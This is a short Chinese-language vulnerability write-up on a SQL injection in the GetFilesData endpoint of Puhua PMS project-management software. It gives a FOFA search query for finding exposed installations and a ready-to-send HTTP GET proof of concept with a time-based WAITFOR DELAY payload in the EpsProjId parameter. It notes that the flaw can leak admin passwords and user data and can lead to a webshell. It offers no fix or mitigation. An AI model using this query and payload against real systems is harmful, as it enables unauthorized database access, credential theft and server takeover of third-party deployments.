## 普华PMS-GetFilesData-sql注入

## 一、漏洞简介
普华PMS GetFilesData 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## fofa
```
body="Power.login.init" && body="Power.ui.warning" && body="Power_login_btn"
```

## poc
```
GET /UploadFile/GetFilesData?EpsProjId=1%27;WAITFOR+DELAY+%270:0:5%27--&StartDate=2&EndDate=2 HTTP/1.1
Host: [已模糊处理]
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
```
